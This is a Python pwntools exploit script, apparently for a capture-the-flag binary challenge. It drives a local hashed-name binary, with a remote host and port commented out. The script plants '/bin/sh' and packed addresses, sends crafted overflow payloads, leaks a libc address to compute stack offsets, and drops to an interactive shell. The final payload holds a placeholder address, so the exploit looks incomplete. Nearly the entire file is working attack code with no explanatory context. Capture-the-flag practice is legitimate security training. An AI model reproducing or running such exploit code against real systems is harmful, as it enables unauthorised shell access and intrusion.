#!/usr/bin/env python

from pwn import *
import sys, struct, time

r = process(['./5d63b69dccbd0d46bcf3e559bf79b4a7'])
print util.proc.pidof(r)
sys.stdin.read(1)

#r = remote('175.119.158.133', 9091)

garbage = r.recv()
name = "/bin/sh\x00"
name += struct.pack("<I", 0x804d768)
r.sendline(name)
garbage = r.recv()

for i in range(1):
	r.sendline('1')
	time.sleep(.1)
	garbage = r.recv(timeout=.2)
	r.send("B" * 21)
	garbage = r.recv(timeout=.2)
	r.send("B" * 21)
	garbage = r.recv(timeout=.2)


time.sleep(1)
r.sendline('3')
print r.recv()
r.sendline('101')

print r.recv()

payload  = "C" * 4
payload += "C" * 4
payload += struct.pack("<I", 0x804d7c4)
payload += struct.pack("<I", 0x0804965f)
payload += struct.pack("<I", 0x804c030)
payload += struct.pack("<I", 0x41414141)
payload += "C" * (199 - len(payload))

r.sendline(payload)
garbage = r.recv()

r.sendline('4')
garbage = r.recvuntil('BYE BYE')
print r.recvline().encode('hex')
print r.recvline().encode('hex')
leak = r.recvline().strip()[::-1].encode('hex')[-8:]
leak = int(leak, 16)
saved_ebp = leak - 4604

log.info("Libc_start_main: " + hex(leak))
log.info("")

payload3 = "C" * 12
payload3 += struct.pack('<I', 0x44444444)

r.send(payload3)

r.interactive()